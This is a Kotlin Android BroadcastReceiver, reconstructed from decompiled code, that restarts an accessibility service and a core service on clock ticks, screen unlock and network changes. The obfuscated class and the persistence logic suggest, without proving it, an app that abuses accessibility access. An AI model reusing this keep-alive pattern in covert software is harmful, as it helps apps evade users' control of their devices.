package com.storm.safe.rock.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import com.storm.safe.rock.service.AppCoreService
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.ActivityMonitor

/**
 * System event BroadcastReceiver — handles TIME_TICK, SCREEN_ON, CONNECTIVITY_CHANGE,
 * USER_PRESENT, SHUTDOWN, and REBOOT actions.
 *
 * Reverse-engineered from JADX: receiver/hgejzydhoqsl.java (148 lines).
 * Renamed: a0 (static) → lastCheckTime, a1 → lastNetworkState, m211381a0 → checkAndRecoverService
 */
class hgejzydhoqsl : BroadcastReceiver() {

    companion object {
        private const val TAG = "hgejzydhoqsl"

        @Volatile
        @JvmStatic
        var lastCheckTime: Long = 0L

        @Volatile
        @JvmStatic
        var lastNetworkState: Boolean = false

        /**
         * Check if accessibility service is running, attempt recovery if not.
         */
        @JvmStatic
        fun checkAndRecoverService(context: Context) {
            try {
                if (MyAccessibilityService.Companion.isServiceReady()) {
                    return
                }
                Log.w(TAG, "⚠️ 无障碍服务未运行，尝试恢复")
                try {
                    ActivityMonitor.logMessage("定时检测发现无障碍服务未运行 正在尝试恢复")
                } catch (_: Exception) {
                }
                try {
                    if (!AppCoreService.isRunning()) {
                        AppCoreService.start(context)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ 启动服务失败", e)
                }
            } catch (_: Exception) {
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        try {
            when (action) {
                "android.intent.action.TIME_TICK" -> {
                    checkAndRecoverService(context)
                }
                "android.intent.action.SCREEN_ON" -> {
                    checkAndRecoverService(context)
                }
                "android.net.conn.CONNECTIVITY_CHANGE" -> {
                    try {
                        val cm = context.getSystemService("connectivity") as ConnectivityManager
                        val activeNetwork = cm.activeNetwork
                        val caps = if (activeNetwork != null) cm.getNetworkCapabilities(activeNetwork) else null
                        val connected = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)

                        val now = System.currentTimeMillis()
                        if (now - lastCheckTime >= 1500 && connected != lastNetworkState) {
                            lastCheckTime = now
                            lastNetworkState = connected
                            if (!connected) {
                                Log.w(TAG, "🌐 网络已断开")
                                ActivityMonitor.logMessage("网络状态变化 网络已断开")
                            } else {
                                try {
                                    if (!AppCoreService.isRunning()) {
                                        AppCoreService.start(context)
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "❌ 启动服务失败", e)
                                }
                                Log.d(TAG, "🌐 网络已恢复")
                                ActivityMonitor.logMessage("网络状态变化 网络已恢复连接")
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 处理网络变化失败", e)
                        return
                    }
                }
                "android.intent.action.USER_PRESENT" -> {
                    checkAndRecoverService(context)
                }
                "android.intent.action.ACTION_SHUTDOWN" -> {
                    ActivityMonitor.logMessage("设备正在关机")
                }
                "android.intent.action.REBOOT" -> {
                    ActivityMonitor.logMessage("设备正在重启")
                }
            }
        } catch (_: Exception) {
        }
    }
}
